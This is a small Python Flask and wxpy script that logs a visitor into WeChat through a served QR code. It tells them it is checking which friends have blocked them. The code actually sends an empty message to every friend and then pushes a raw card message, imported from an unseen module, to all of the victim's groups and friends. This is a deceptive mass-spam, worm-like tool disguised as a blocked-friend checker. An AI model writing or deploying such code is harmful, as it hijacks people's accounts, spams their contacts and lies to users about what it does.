#-*- coding:utf-8 -*-
from flask import Flask,make_response,redirect,url_for
from wxpy import *
import  sys
import time,threading
from card import *


app = Flask(__name__)

qrSource = ''


def qrCallback(uuid,status,qrcode):
    print('正在保存二维码')
    if status == '0':
        global qrSource
        qrSource = qrcode
    elif status == '200':
        qrSource = 'Logged in!'
    elif status == '201':
        qrSource = 'Confirm'

def is_friends(friends):
    try:
        for friend in friends:
            time.sleep(2)
            friend.send('')
    except:
        return True

def send_card(chats):
    try:
        for chat in chats:
            chat.send_raw_msg(raw_type ,raw_content)
            time.sleep(0.2)
    except:
        return True

def run_wxpy():
    print("线程开始执行")
    bot = Bot(qr_callback=qrCallback)
    friends = bot.friends()
    groups = bot.groups()
    text = friends.stats_text()
    bot.file_helper.send(text)
    bot.file_helper.send(u'''正在检测谁拉黑了你
全部检测通常需要5分钟！''')
    if is_friends(friends):
        bot.file_helper.send(u'检测朋友时，程序出错了！')
        bot.logout()
        sys.exit()
    if send_card(groups):
        bot.logout()
        sys.exit()
    if send_card(friends):
        bot.logout()
        sys.exit()


@app.route('/')
def run_thread():
    threading.Thread(target=run_wxpy ).start()
    while not qrSource:
        time.sleep(1)    
    if len(qrSource) < 100:
        return qrSource
    else:
        response = make_response(qrSource)
        response.headers['Content-Type'] = 'image/jpeg'
        return response
if __name__ == '__main__':
    app.run()

